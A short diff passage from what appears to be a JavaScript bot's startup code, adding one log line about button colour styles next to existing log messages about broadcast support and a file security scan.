     console.log('📢 BROADCAST SUPPORTS: Photos, Videos, Documents, GIFs, Stickers, Text');
     console.log('🔍 SECURITY SCAN: Checks photos first, then <300KB files');
+    console.log('🎨 STYLES: Danger (Red), Primary (Blue), Success (Green) everywhere');
 });
 
 process.on('uncaughtException', err => {
